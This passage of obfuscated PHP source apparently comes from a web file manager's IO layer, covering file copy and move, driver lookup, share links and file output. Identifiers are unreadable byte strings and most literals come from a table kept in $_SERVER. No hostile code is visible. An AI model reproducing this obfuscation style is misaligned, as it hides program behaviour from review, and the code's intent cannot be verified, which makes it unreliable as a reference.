? $Ÿ¥Ù»ó›[$ÅÑçåŒŠ[$™üŠ„Õâ[33]]] : $ÅÑçåŒŠ[$™üŠ„Õâ[33]], $ÅÑçåŒŠ[$™üŠ„Õâ[35]] == $™üŠ„Õâ[88] ? $™üŠ„Õâ[1122] : $™üŠ„Õâ[1132] . $ÅÑçåŒŠ[$™üŠ„Õâ[56]], $ÅÑçåŒŠ[$™üŠ„Õâ[57]] == $™üŠ„Õâ[88] ? $™üŠ„Õâ[1133] : $™üŠ„Õâ[12]); $Ğè°ıè¶[] = trim(implode($™üŠ„Õâ[53], $Ä‡Ÿ¹È)); } foreach ($±åßˆëÛ as $ö‹Ş—„ı => $İ¤¯‚ŞÔ) { $‘óóÒİ® = str_replace($™üŠ„Õâ[1134] . $æÆÊÉ”¢ . $™üŠ„Õâ[11], $™üŠ„Õâ[12], $ö‹Ş—„ı); $ıè…³şá = str_replace(array($™üŠ„Õâ[118], $™üŠ„Õâ[956]), $™üŠ„Õâ[385], substr($İ¤¯‚ŞÔ, stripos($İ¤¯‚ŞÔ, $™üŠ„Õâ[260]))); if ($‘óóÒİ® == $™üŠ„Õâ[1111]) { $Ò§Á—ˆ¨ = $™üŠ„Õâ[1135] . $ƒ“„Ó‰ø . $™üŠ„Õâ[1136]; } else { $Ò§Á—ˆ¨ = (stripos($‘óóÒİ®, $™üŠ„Õâ[11]) ? $™üŠ„Õâ[1137] : $™üŠ„Õâ[12]) . ($™üŠ„Õâ[1138] . $‘óóÒİ® . $™üŠ„Õâ[1139] . $ıè…³şá); } $Ğè°ıè¶[] = $Ò§Á—ˆ¨; } $„‡¨äíë = array($™üŠ„Õâ[1140] . $æÆÊÉ”¢ . $™üŠ„Õâ[1141], $™üŠ„Õâ[1142] . $æÆÊÉ”¢ . $™üŠ„Õâ[1143], implode($™üŠ„Õâ[50] . PHP_EOL, $Ğè°ıè¶), $™üŠ„Õâ[1144]); $È½Å“ü­ = implode(PHP_EOL, $„‡¨äíë); if ($ˆ³ã’Ç && $ˆ³ã’Ç == $™üŠ„Õâ[803]) { return $È½Å“ü­; } $àŸ—Ñˆå = array($™üŠ„Õâ[803] => $È½Å“ü­, $™üŠ„Õâ[13] => $û¢äØ†); return $ˆ³ã’Ç ? $àŸ—Ñˆå[$ˆ³ã’Ç] : $àŸ—Ñˆå; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ğ™â¸¨ê, $Ş»Ïğ‘ş) { $‘Ú¬¨€Œ =& $_SERVER[Ó¡Ÿ§‚]; $ÎÈÊ¥‹ = $Ş»Ïğ‘ş; $GLOBALS[$‘Ú¬¨€Œ[1145]] = $‘Ú¬¨€Œ[1146] . $Ğ™â¸¨ê; Hook::trigger($‘Ú¬¨€Œ[1146] . $Ğ™â¸¨ê . $‘Ú¬¨€Œ[1147], $ÎÈÊ¥‹); $•†‘Ê–Œ = self::driverMake($Ş»Ïğ‘ş[0]); if (!$•†‘Ê–Œ) { return !1; } if (method_exists($•†‘Ê–Œ, $Ğ™â¸¨ê)) { $õí£áŒ› = @call_user_func_array(array($•†‘Ê–Œ, $Ğ™â¸¨ê), $Ş»Ïğ‘ş); } else { if (method_exists($•†‘Ê–Œ, $‘Ú¬¨€Œ[1148])) { $õí£áŒ› = @call_user_func_array(array($•†‘Ê–Œ, $Ğ™â¸¨ê), $Ş»Ïğ‘ş); } else { if (method_exists(self, $Ğ™â¸¨ê)) { $õí£áŒ› = @call_user_func_array(array(self, $Ğ™â¸¨ê), $Ş»Ïğ‘ş); } else { $õí£áŒ› = call_user_func_array(array(parent, $Ğ™â¸¨ê), $Ş»Ïğ‘ş); } } } Hook::trigger($‘Ú¬¨€Œ[1146] . $Ğ™â¸¨ê . $‘Ú¬¨€Œ[1149], $ÎÈÊ¥‹, $õí£áŒ›); return $õí£áŒ›; } public static function init($‹€ŞÄßŒ) { return self::driverMake($‹€ŞÄßŒ); } public static function copy($ÎşßšÃ¯, $¯ìë³œ, $œ²Ç¬æ = false, $çÔã÷Ìß = false) { return self::copyMoveStart($ÎşßšÃ¯, $¯ìë³œ, $œ²Ç¬æ, $_SERVER[Ó¡Ÿ§‚][555], $çÔã÷Ìß); } public static function move($•®‘ëãÇ, $ˆ…Äî, $Ú¢—•ˆ‚ = false, $Ïñå‡‚è = false) { return self::copyMoveStart($•®‘ëãÇ, $ˆ…Äî, $Ú¢—•ˆ‚, $_SERVER[Ó¡Ÿ§‚][557], $Ïñå‡‚è); } private static function copyMoveStart($†¤Ÿ«, $ÆÍ¢á‚¡, $ûÍšÛŒÈ, $À¼Å¥’, $¶â­‘íË) { $Õß÷†£  =& $_SERVER[Ó¡Ÿ§‚]; $Û¹ô‘¦„ = array($†¤Ÿ«, $ÆÍ¢á‚¡, $ûÍšÛŒÈ, $¶â­‘íË); Hook::trigger($Õß÷†£ [1146] . $À¼Å¥’ . $Õß÷†£ [1147], $Û¹ô‘¦„); $ùµ·ÇÏÍ = self::copyMove($†¤Ÿ«, $ÆÍ¢á‚¡, $ûÍšÛŒÈ, $À¼Å¥’, $¶â­‘íË); Hook::trigger($Õß÷†£ [1146] . $À¼Å¥’ . $Õß÷†£ [1149], $Û¹ô‘¦„, $ùµ·ÇÏÍ); return $ùµ·ÇÏÍ; } public static function saveFile($Åæı¯¡Ô, $Âú¢ÛåÂ, $‡»¾ßóò = true) { $˜»Õ£Î =& $_SERVER[Ó¡Ÿ§‚]; $Ò×ÑĞ›ˆ = self::info($Âú¢ÛåÂ); $‹Ø«•™ = self::driverMake($Åæı¯¡Ô); $ÇÇ¦àÊÛ = self::driverMake($Âú¢ÛåÂ); $‰²‚£Ò„ = !1; if ($ÇÇ¦àÊÛ->pathParse[$˜»Õ£Î[1150]]) { $‰²‚£Ò„ = $ÇÇ¦àÊÛ; $¹©©£¾õ = $ÇÇ¦àÊÛ->pathParse[$˜»Õ£Î[1150]]; $ÇÇ¦àÊÛ = self::driverMake($¹©©£¾õ); } if ($‹Ø«•™->pathParse[$˜»Õ£Î[1150]]) { $§ğöÅŞÃ = $‹Ø«•™->pathParse[$˜»Õ£Î[1150]]; $‹Ø«•™ = self::driverMake($§ğöÅŞÃ); } $‘Â¼—Î² = $ÇÇ¦àÊÛ->pathFather($Âú¢ÛåÂ); $¾›Œ®½û = !0; if (!$‡»¾ßóò && self::driverIsSame($‹Ø«•™, $ÇÇ¦àÊÛ)) { $¾›Œ®½û = !1; } $Î±‘²Æß = self::copyFile($‹Ø«•™, $Åæı¯¡Ô, $ÇÇ¦àÊÛ, $‘Â¼—Î², $Ò×ÑĞ›ˆ[$˜»Õ£Î[32]], $¾›Œ®½û); if ($‰²‚£Ò„) { $Î±‘²Æß = $‰²‚£Ò„->getPathOuter($Î±‘²Æß); } return $Î±‘²Æß; } private static function copyMove($•‡–¡Üİ, $Úğš¯Æ, $Ü×·“³ş, $™Ï¶˜Àƒ, $«ğê£»‚ = false) { $®“Ş€Í =& $_SERVER[Ó¡Ÿ§‚]; if (!$•‡–¡Üİ || $•‡–¡Üİ == $®“Ş€Í[8] || !$Úğš¯Æ) { return !1; } ignore_timeout(); $’ÈåäôÁ = self::driverMake($•‡–¡Üİ); $„Ïç³šò = self::driverMake($Úğš¯Æ); $Ë”× ƒ = $™Ï¶˜Àƒ == $®“Ş€Í[557]; $Ø©çî = !1; if ($„Ïç³šò->pathParse[$®“Ş€Í[1150]]) { $Ø©çî = $„Ïç³šò; $Úğš¯Æ = $„Ïç³šò->pathParse[$®“Ş€Í[1150]]; $„Ïç³šò = self::driverMake($Úğš¯Æ); } if ($’ÈåäôÁ->pathParse[$®“Ş€Í[1150]]) { $•‡–¡Üİ = $’ÈåäôÁ->pathParse[$®“Ş€Í[1150]]; $’ÈåäôÁ = self::driverMake($•‡–¡Üİ); } self::check($’ÈåäôÁ, $•‡–¡Üİ, $„Ïç³šò, $Úğš¯Æ); Hook::trigger($®“Ş€Í[1151], $’ÈåäôÁ, $•‡–¡Üİ, $„Ïç³šò, $Úğš¯Æ); $¼¸·ò³ = self::driverIsSame($’ÈåäôÁ, $„Ïç³šò); if ($¼¸·ò³) { if ($™Ï¶˜Àƒ == $®“Ş€Í[557] && !method_exists($„Ïç³šò, $®“Ş€Í[1152]) && trim($Úğš¯Æ, $®“Ş€Í[8]) == trim($„Ïç³šò->pathFather($•‡–¡Üİ), $®“Ş€Í[8])) { if ($’ÈåäôÁ->pathThis($•‡–¡Üİ) != $«ğê£»‚ && !$’ÈåäôÁ->isTypeObject()) { return $’ÈåäôÁ->rename($•‡–¡Üİ, $«ğê£»‚); } return $„Ïç³šò->getPathOuter($•‡–¡Üİ); } if (method_exists($„Ïç³šò, $™Ï¶˜Àƒ)) { return $„Ïç³šò->{$™Ï¶˜Àƒ}($•‡–¡Üİ, $Úğš¯Æ, $Ü×·“³ş, $«ğê£»‚); } } if ($¼¸·ò³ && $™Ï¶˜Àƒ == $®“Ş€Í[557] && $„Ïç³šò->getType() == $®“Ş€Í[106]) { $À¯‹úÑ¼ = $„Ïç³šò->movePath($•‡–¡Üİ, $Úğš¯Æ, $«ğê£»‚); if ($À¯‹úÑ¼) { return $À¯‹úÑ¼; } } $Ô—˜í³ = $’ÈåäôÁ->isFile($•‡–¡Üİ); if (!$Ô—˜í³ && $„Ïç³šò->getType() == $®“Ş€Í[756] && $’ÈåäôÁ->getType() == $®“Ş€Í[106]) { $À¯‹úÑ¼ = $„Ïç³šò->copyFolderFromIO($’ÈåäôÁ, $•‡–¡Üİ, $Úğš¯Æ, $Ü×·“³ş, $Ë”× ƒ, $«ğê£»‚); } else { $À¯‹úÑ¼ = self::copyPath($’ÈåäôÁ, $•‡–¡Üİ, $„Ïç³šò, $Úğš¯Æ, $Ü×·“³ş, $Ë”× ƒ, $Ô—˜í³, $«ğê£»‚); } if ($À¯‹úÑ¼ && $Ë”× ƒ) { $’ÈåäôÁ->remove($•‡–¡Üİ); } if ($Ø©çî) { $À¯‹úÑ¼ = $Ø©çî->getPathOuter($À¯‹úÑ¼); } return $À¯‹úÑ¼; } private static function check($Îí¤ãß°, $ÏÒºäæ¯, $Ğà©Òº”, &$Œ¡Ô“ó¼) { $²µâ½É =& $_SERVER[Ó¡Ÿ§‚]; if (self::driverIsSame($Îí¤ãß°, $Ğà©Òº”) && $Îí¤ãß°->isFolder($ÏÒºäæ¯) && $Îí¤ãß°->isParentOf($ÏÒºäæ¯, $Œ¡Ô“ó¼)) { show_json(LNG($²µâ½É[1153]), !1); } if (!$Îí¤ãß°->exist($ÏÒºäæ¯)) { show_json(LNG($²µâ½É[105]), !1); } } private static function copyPath($¦şÚ½µ‘, $ŸŒ±µŒÈ, $¯Éùğ‰, $ãª½ÔÔÃ, $…õ³„õü, $´³š«óÌ, $Ş¡Ì’âß, $ó££Ó˜È = false, $¾Ç¡Ğ„ = true) { $Êâ˜äÎ® =& $_SERVER[Ó¡Ÿ§‚]; $ÜàŞ·… = empty($ó££Ó˜È) && $ó££Ó˜È !== $Êâ˜äÎ®[198] ? $¦şÚ½µ‘->pathThis($ŸŒ±µŒÈ) : $ó££Ó˜È; if ($…õ³„õü) { $Ï½È¿¸˜ = $¯Éùğ‰->fileNameExist($ãª½ÔÔÃ, $ÜàŞ·…); $Å¯íºñ· = $ÜàŞ·…; $ÜàŞ·… = $¯Éùğ‰->fileNameAuto($ãª½ÔÔÃ, $ÜàŞ·…, $…õ³„õü, !$Ş¡Ì’âß); if (!$Ï½È¿¸˜ || $Å¯íºñ· != $ÜàŞ·…) { $…õ³„õü = !1; } if ($¾Ç¡Ğ„ && !$…õ³„õü) { $¯Éùğ‰->_data[$Êâ˜äÎ®[1154]] = !0; } } if ($Ş¡Ì’âß) { return self::copyFile($¦şÚ½µ‘, $ŸŒ±µŒÈ, $¯Éùğ‰, $ãª½ÔÔÃ, $ÜàŞ·…, $´³š«óÌ); } if ($…õ³„õü == REPEAT_RENAME_FOLDER) { $…õ³„õü = !1; } $Ø‘½­ôé = rtrim($ãª½ÔÔÃ, $Êâ˜äÎ®[8]) . $Êâ˜äÎ®[8] . $ÜàŞ·…; $±ËÍ¹ÔŸ = $¯Éùğ‰->mkdir($¯Éùğ‰->getPath($Ø‘½­ôé), $…õ³„õü); $ãª½ÔÔÃ = $¯Éùğ‰->getPathInner($±ËÍ¹ÔŸ); $™ßøÅ²Ÿ = $¦şÚ½µ‘->listPath($ŸŒ±µŒÈ, !0); $™ßøÅ²Ÿ = is_array($™ßøÅ²Ÿ) ? $™ßøÅ²Ÿ : array($Êâ˜äÎ®[83] => array(), $Êâ˜äÎ®[82] => array()); $µÉÜ¶…¦ = array_merge($™ßøÅ²Ÿ[$Êâ˜äÎ®[83]], $™ßøÅ²Ÿ[$Êâ˜äÎ®[82]]); foreach ($µÉÜ¶…¦ as $ö˜Ãª³Õ) { $áãŠÑ®Ğ = $ö˜Ãª³Õ[$Êâ˜äÎ®[33]] == $Êâ˜äÎ®[200]; $ŸŒ±µŒÈ = $¦şÚ½µ‘->getPathInner($ö˜Ãª³Õ[$Êâ˜äÎ®[84]]); $ã¸•ƒèú = self::copyPath($¦şÚ½µ‘, $ŸŒ±µŒÈ, $¯Éùğ‰, $ãª½ÔÔÃ, $…õ³„õü, $´³š«óÌ, $áãŠÑ®Ğ, !1, !1); if (!$ã¸•ƒèú) { IO::errorTips($Êâ˜äÎ®[1155] . $ŸŒ±µŒÈ . $Êâ˜äÎ®[70] . $ãª½ÔÔÃ); } } self::copyMoveKeepInfo($¦şÚ½µ‘, $ŸŒ±µŒÈ, $±ËÍ¹ÔŸ); return $±ËÍ¹ÔŸ; } private static function copyFile($¤™ş¢Š, $“ïÍÔ­, $µ–ÈÌÖÔ, $ÁˆËÚóî, $Ä»¶œÚ, $ñü‘Í÷æ) { $ÚòÎñ®ô =& $_SERVER[Ó¡Ÿ§‚]; $ÁˆËÚóî = $µ–ÈÌÖÔ->getPath(rtrim($ÁˆËÚóî, $ÚòÎñ®ô[8]) . $ÚòÎñ®ô[8] . $Ä»¶œÚ); $ ÷Ó—ÆĞ = $ÚòÎñ®ô[1156] . time() . rand_string(5); Hook::trigger($ÚòÎñ®ô[1157], $¤™ş¢Š, $“ïÍÔ­, $µ–ÈÌÖÔ, $ÁˆËÚóî, $Ä»¶œÚ, $ ÷Ó—ÆĞ); if (self::driverIsSame($¤™ş¢Š, $µ–ÈÌÖÔ)) { if ($ñü‘Í÷æ) { $Å€Ç×™´ = $µ–ÈÌÖÔ->moveFile($“ïÍÔ­, $ÁˆËÚóî); } else { $Å€Ç×™´ = $µ–ÈÌÖÔ->copyFile($“ïÍÔ­, $ÁˆËÚóî); } Hook::trigger($ÚòÎñ®ô[1158], $¤™ş¢Š, $“ïÍÔ­, $µ–ÈÌÖÔ, $ÁˆËÚóî, $Ä»¶œÚ, $Å€Ç×™´); self::copyMoveKeepInfo($¤™ş¢Š, $“ïÍÔ­, $Å€Ç×™´); return $Å€Ç×™´; } $ììõúê§ = TEMP_FILES; if ($GLOBALS[$ÚòÎñ®ô[6]][$ÚòÎñ®ô[89]][$ÚòÎñ®ô[795]]) { $ììõúê§ = $GLOBALS[$ÚòÎñ®ô[6]][$ÚòÎñ®ô[89]][$ÚòÎñ®ô[795]]; } $Œ¬¼§ÁÀ = $ììõúê§; mk_dir($Œ¬¼§ÁÀ); $©¿û²³… = $Œ¬¼§ÁÀ . $ ÷Ó—ÆĞ; $•Èíô‘€ = $©¿û²³…; $©¿û²³… = $¤™ş¢Š->download($“ïÍÔ­, $©¿û²³…); $©¿û²³… = $¤™ş¢Š->iconvApp($©¿û²³…); if (substr($©¿û²³…, strlen($ììõúê§)) == $ììõúê§) { $ñü‘Í÷æ = !0; } $Å€Ç×™´ = $µ–ÈÌÖÔ->upload($ÁˆËÚóî, $©¿û²³…, $ñü‘Í÷æ); self::remove($•Èíô‘€); Hook::trigger($ÚòÎñ®ô[1158], $¤™ş¢Š, $“ïÍÔ­, $µ–ÈÌÖÔ, $ÁˆËÚóî, $Ä»¶œÚ, $Å€Ç×™´); self::copyMoveKeepInfo($¤™ş¢Š, $“ïÍÔ­, $Å€Ç×™´); return $Å€Ç×™´; } private static function copyMoveKeepInfo($—åŞÕöî, $´¿éÅ²Ò, $èÔõ´‚š) { if (!$èÔõ´‚š) { return; } $¿œÅ£“ = $—åŞÕöî->info($´¿éÅ²Ò); if (!is_array($¿œÅ£“)) { return; } IO::setModifyTime($èÔõ´‚š, $¿œÅ£“[$_SERVER[Ó¡Ÿ§‚][85]]); } public static function pathFather($íÏè²ô‡) { $ß™îøö¯ = IO::init($íÏè²ô‡); $·»Õ®îğ = $ß™îøö¯->pathFather($ß™îøö¯->path); return $ß™îøö¯->getPathOuter($·»Õ®îğ); } public static function fileOut($ŠïÊÍÎ, $±Ãå©û… = false, $×ğØ–ñ® = false, $˜¿±Ş× = '') { $“‰Ú“ = self::driverMake($ŠïÊÍÎ); if ($“‰Ú“->isFileOutServer()) { return $“‰Ú“->fileOutServer($ŠïÊÍÎ, $±Ãå©û…, $×ğØ–ñ®, $˜¿±Ş×); } return $“‰Ú“->fileOut($ŠïÊÍÎ, $±Ãå©û…, $×ğØ–ñ®, $˜¿±Ş×); } public static function fileOutImage($¹îŒ¨ò², $²Á™Ô–— = 250) { $­££©’ = array(250, 600, 1200, 2000, 3000, 5000); for ($¤•ÇÖ– = 0; $¤•ÇÖ– < count($­££©’); $¤•ÇÖ–++) { if ($¤•ÇÖ– == 0 && $²Á™Ô–— <= $­££©’[$¤•ÇÖ–]) { $²Á™Ô–— = $­££©’[$¤•ÇÖ–]; break; } else { if ($²Á™Ô–— > $­££©’[$¤•ÇÖ– - 1] && $²Á™Ô–— <= $­££©’[$¤•ÇÖ–]) { $²Á™Ô–— = $­££©’[$¤•ÇÖ–]; break; } else { if ($¤•ÇÖ– == count($­££©’) - 1 && $²Á™Ô–— > $­££©’[$¤•ÇÖ–]) { $²Á™Ô–— = $­££©’[$¤•ÇÖ–]; break; } } } } $ò¥â = self::driverMake($¹îŒ¨ò²); if ($ò¥â->isFileOutServer()) { return $ò¥â->fileOutImageServer($¹îŒ¨ò², $²Á™Ô–—); } return $ò¥â->fileOutImage($¹îŒ¨ò², $²Á™Ô–—); } private static function driverIsSame($¾äÚ¹Ò, $ÃÜ®áĞå) { $¬Å÷¨º™ =& $_SERVER[Ó¡Ÿ§‚]; $Ç‰É½Å = $¾äÚ¹Ò->getType(); $¹³Ô´ö = $ÃÜ®áĞå->getType(); if ($Ç‰É½Å != $¹³Ô´ö) { return !1; } if ($Ç‰É½Å == $¬Å÷¨º™[756]) { return !0; } if ($Ç‰É½Å == $¬Å÷¨º™[106]) { return !0; } if ($¾äÚ¹Ò->pathDriver == $ÃÜ®áĞå->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ò¦‹û×±, $Ô¼ƒ•Ç¤) { $‚¸ˆà’µ =& $_SERVER[Ó¡Ÿ§‚]; if (!IO::exist($Ò¦‹û×±)) { return !1; } if (!IO::exist($Ô¼ƒ•Ç¤)) { IO::mkdir($Ô¼ƒ•Ç¤); } $¥ı™‹İ = array_to_keyvalue(self::listAllSimple($Ò¦‹û×±), $‚¸ˆà’µ[84]); $Ó¾‡ŸÎ“ = array_to_keyvalue(self::listAllSimple($Ô¼ƒ•Ç¤), $‚¸ˆà’µ[84]); $ëµğÁ»Ô = array(); $íÃ†±¶‰ = array(); foreach ($¥ı™‹İ as $š÷şˆ¾¯ => $ğ³Ô·Şâ) { if (isset($Ó¾‡ŸÎ“[$š÷şˆ¾¯])) { if ($ğ³Ô·Şâ[$‚¸ˆà’µ[75]] == 1) { continue; } if ($Ó¾‡ŸÎ“[$š÷şˆ¾¯][$‚¸ˆà’µ[76]] == $ğ³Ô·Şâ[$‚¸ˆà’µ[76]]) { continue; } } if ($ğ³Ô·Şâ[$‚¸ˆà’µ[75]] == 1) { $íÃ†±¶‰[] = $Ô¼ƒ•Ç¤ . $‚¸ˆà’µ[8] . trim($š÷şˆ¾¯, $‚¸ˆà’µ[8]); continue; } $Ë‡ØœĞÓ = strstr(trim($š÷şˆ¾¯, $‚¸ˆà’µ[8]), $‚¸ˆà’µ[8]) ? get_path_father($š÷şˆ¾¯) : $‚¸ˆà’µ[12]; $ëµğÁ»Ô[] = array($‚¸ˆà’µ[1159] => $ğ³Ô·Şâ[$‚¸ˆà’µ[86]], $‚¸ˆà’µ[1160] => rtrim($Ô¼ƒ•Ç¤, $‚¸ˆà’µ[8]) . $‚¸ˆà’µ[8] . $Ë‡ØœĞÓ, $‚¸ˆà’µ[1161] => $ğ³Ô·Şâ); } $šÁüÁœ = array($‚¸ˆà’µ[200] => $ëµğÁ»Ô, $‚¸ˆà’µ[75] => $íÃ†±¶‰); Hook::trigger($‚¸ˆà’µ[1162], $Ò¦‹û×±, $Ô¼ƒ•Ç¤, $šÁüÁœ); foreach ($íÃ†±¶‰ as $ğ³Ô·Şâ) { IO::mkdir($ğ³Ô·Şâ); } foreach ($ëµğÁ»Ô as $ğ³Ô·Şâ) { IO::copy($ğ³Ô·Şâ[$‚¸ˆà’µ[1159]], $ğ³Ô·Şâ[$‚¸ˆà’µ[1160]], REPEAT_REPLACE); } } public static function fileSubstr($”øÉ¾ĞÈ, $İ„¨×ú÷, $¡°”²Â = false) { $ÇÃÓßèú =& $_SERVER[Ó¡Ÿ§‚]; $…íßı¿ò = self::driverMake($”øÉ¾ĞÈ); $‹úŒÖ… = $…íßı¿ò->size($”øÉ¾ĞÈ); $øªÜòö­ = $İ„¨×ú÷; $ˆõûöÔ¦ = $¡°”²Â; if ($İ„¨×ú÷ < 0) { $İ„¨×ú÷ = $‹úŒÖ… + $İ„¨×ú÷; } if ($¡°”²Â === !1) { $¡°”²Â = $‹úŒÖ… - $İ„¨×ú÷; } if ($İ„¨×ú÷ + $¡°”²Â > $‹úŒÖ…) { $¡°”²Â = $‹úŒÖ… - $İ„¨×ú÷; } if (!$‹úŒÖ… && $…íßı¿ò->getType() == $ÇÃÓßèú[106] && !$…íßı¿ò->exist($”øÉ¾ĞÈ)) { $î“¹éĞ = get_path_this($”øÉ¾ĞÈ); $ĞäÔİúÊ = parse_url_query($î“¹éĞ); if (is_array($ĞäÔİúÊ) && isset($ĞäÔİúÊ[$ÇÃÓßèú[32]])) { $î“¹éĞ = urldecode($ĞäÔİúÊ[$ÇÃÓßèú[32]]); } throw new Exception($ÇÃÓßèú[1163] . LNG($ÇÃÓßèú[1164]) . $ÇÃÓßèú[965] . clear_html($î“¹éĞ) . $ÇÃÓßèú[12]); } if ($¡°”²Â <= 0) { return $ÇÃÓßèú[12]; } if ($İ„¨×ú÷ < 0 || $İ„¨×ú÷ >= $‹úŒÖ… || $¡°”²Â > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\x52\145\x61\x64\x20\x65\162\162\x6f\162\41\40\163\164\x61\x72\x74\75{$İ„¨×ú÷}\73\x6c\145\x6e\147\164\150\75{$¡°”²Â}\x3b\x20\x73\x69\x7a\145\x3d{$‹úŒÖ…}\73"); } $ÔÅ›ÃÃ = $…íßı¿ò->fileSubstr($”øÉ¾ĞÈ, $İ„¨×ú÷, $¡°”²Â); if (!$ÔÅ›ÃÃ && $¡°”²Â && isset($GLOBALS[$ÇÃÓßèú[1165]])) { throw new Exception($GLOBALS[$ÇÃÓßèú[1165]][$ÇÃÓßèú[1166]]); } return $ÔÅ›ÃÃ; } private static function driverMake(&$µ´ÈˆßŸ) { $ôéŞÂÆÊ =& $_SERVER[Ó¡Ÿ§‚]; $êâÂŞ¯‰ = KodIO::parse($µ´ÈˆßŸ); if (!self::$driverListSystem) { $Â©‘ÀÇ™ = Model($ôéŞÂÆÊ[766])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Â©‘ÀÇ™, $ôéŞÂÆÊ[399]); } if ($êâÂŞ¯‰[$ôéŞÂÆÊ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$êâÂŞ¯‰[$ôéŞÂÆÊ[399]]]) { return !1; } $µ´ÈˆßŸ = $êâÂŞ¯‰[$ôéŞÂÆÊ[1167]]; $à•‚Ó½Ì = self::driverGet($êâÂŞ¯‰, $µ´ÈˆßŸ); return $à•‚Ó½Ì; } private static function driverGet($áÉ÷ ¾Û, &$‘Îïòòœ) { $É·¬Ô¬¼ =& $_SERVER[Ó¡Ÿ§‚]; $İš¦À°Ï = $áÉ÷ ¾Û[$É·¬Ô¬¼[1168]]; $²Ó×²ŞÊ = $áÉ÷ ¾Û[$É·¬Ô¬¼[399]]; switch ($áÉ÷ ¾Û[$É·¬Ô¬¼[33]]) { case KodIO::KOD_IO: $À˜”™‡ = self::$driverListSystem[$²Ó×²ŞÊ]; break; case KodIO::KOD_SOURCE: $‘Îïòòœ = $²Ó×²ŞÊ . $‘Îïòòœ; $À˜”™‡ = array($É·¬Ô¬¼[1169] => $É·¬Ô¬¼[1170], $É·¬Ô¬¼[6] => $áÉ÷ ¾Û); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $½ŞÜ†˜« = $GLOBALS[$É·¬Ô¬¼[1171]]; self::$driverListUser = array_to_keyvalue($½ŞÜ†˜«, $É·¬Ô¬¼[399]); } $À˜”™‡ = self::$driverListUser[$²Ó×²ŞÊ]; break; case KodIO::KOD_SHARE_LINK: $À˜”™‡ = array($É·¬Ô¬¼[1169] => $É·¬Ô¬¼[1172], $É·¬Ô¬¼[6] => $áÉ÷ ¾Û); $·ë¬µÎè = Action($É·¬Ô¬¼[1173])->sharePathInfo($áÉ÷ ¾Û[$É·¬Ô¬¼[84]]); $‘Îïòòœ = $·ë¬µÎè[$É·¬Ô¬¼[411]]; if (!$·ë¬µÎè[$É·¬Ô¬¼[411]]) { $ÚŠ¡–şë = Model($É·¬Ô¬¼[601])->getInfo($·ë¬µÎè[$É·¬Ô¬¼[602]]); $‘Îïòòœ = KodIO::clear($ÚŠ¡–şë[$É·¬Ô¬¼[1174]] . $áÉ÷ ¾Û[$É·¬Ô¬¼[1167]]); $áÉ÷ ¾Û[$É·¬Ô¬¼[495]] = $ÚŠ¡–şë; $áÉ÷ ¾Û[$É·¬Ô¬¼[1150]] = $‘Îïòòœ; $À˜”™‡ = array($É·¬Ô¬¼[1169] => $É·¬Ô¬¼[1175], $É·¬Ô¬¼[6] => $áÉ÷ ¾Û); } break; case KodIO::KOD_SHARE_ITEM: $À˜”™‡ = array($É·¬Ô¬¼[1169] => $É·¬Ô¬¼[1176], $É·¬Ô¬¼[6] => $áÉ÷ ¾Û); $ÚŠ¡–şë = Model($É·¬Ô¬¼[601])->getInfo($áÉ÷ ¾Û[$É·¬Ô¬¼[399]]); if ($ÚŠ¡–şë[$É·¬Ô¬¼[411]] == $É·¬Ô¬¼[198]) { $‘Îïòòœ = KodIO::clear($ÚŠ¡–şë[$É·¬Ô¬¼[1174]] . $áÉ÷ ¾Û[$É·¬Ô¬¼[1167]]); $áÉ÷ ¾Û[$É·¬Ô¬¼[495]] = $ÚŠ¡–şë; $áÉ÷ ¾Û[$É·¬Ô¬¼[1150]] = $‘Îïòòœ; $À˜”™‡ = array($É·¬Ô¬¼[1169] => $É·¬Ô¬¼[1177], $É·¬Ô¬¼[6] => $áÉ÷ ¾Û); } else { if (!$‘Îïòòœ) { $‘Îïòòœ = $ÚŠ¡–şë[$É·¬Ô¬¼[411]]; } } break; default: $‘Îïòòœ = $áÉ÷ ¾Û[$É·¬Ô¬¼[84]]; $À˜”™‡ = array($É·¬Ô¬¼[1169] => $É·¬Ô¬¼[1178]); break; } $ªˆ¶ŠŒ¼ = $áÉ÷ ¾Û[$É·¬Ô¬¼[84]]; if (!isset(self::$driverCache[$ªˆ¶ŠŒ¼])) { $Á Äá§ = strtolower($À˜”™‡[$É·¬Ô¬¼[95]]); $Ï¶¢’Ü¹ = $GLOBALS[$É·¬Ô¬¼[6]][$É·¬Ô¬¼[89]][$É·¬Ô¬¼[825]]; $¢´âÕäú = $É·¬Ô¬¼[74] . (isset($Ï¶¢’Ü¹[$Á Äá§]) ? $Ï¶¢’Ü¹[$Á Äá§] : ucfirst($Á Äá§)); if (!class_exists($¢´âÕäú)) { show_json("{$¢´âÕäú}\40\x6e\x6f\164\x20\x65\170\x69\x73\164\x73\x21", !1); } $­Ò…ËÛ„ = isset($À˜”™‡[$É·¬Ô¬¼[6]]) ? $À˜”™‡[$É·¬Ô¬¼[6]] : !1; self::$driverCache[$ªˆ¶ŠŒ¼] = new $¢´âÕäú($­Ò…ËÛ„); } $Áùï²º = self::$driverCache[$ªˆ¶ŠŒ¼]; $Áùï²º->pathDriver = $İš¦À°Ï; $Áùï²º->pathBase = $É·¬Ô¬¼[12]; if (isset($À˜”™‡[$É·¬Ô¬¼[6]][$É·¬Ô¬¼[1179]])) { $Áùï²º->pathBase = rtrim($À˜”™‡[$É·¬Ô¬¼[6]][$É·¬Ô¬¼[1179]], $É·¬Ô¬¼[8]) . $É·¬Ô¬¼[8]; $‘Îïòòœ = $Áùï²º->pathBase . ltrim($‘Îïòòœ, $É·¬Ô¬¼[8]); } $‘Îïòòœ = $Áùï²º->getPath($‘Îïòòœ); if (isset($áÉ÷ ¾Û[$É·¬Ô¬¼[1150]])) { $‘Îïòòœ = $áÉ÷ ¾Û[$É·¬Ô¬¼[1150]]; } $Áùï²º->path = $‘Îïòòœ; return $Áùï²º; } public static function errorTips($ì€÷õ¼± = false) { $ÉüéÂÜ‚ =& $_SERVER[Ó¡Ÿ§‚]; static $³Ë¨®‚» = array(); $ıÀ…ˆÛû = 1000; if ($ì€÷õ¼± === -1) { return $³Ë¨®‚» ? $³Ë¨®‚»[count($³Ë¨®‚») - 1] : $ÉüéÂÜ‚[12]; } if ($ì€÷õ¼± === !1) { return 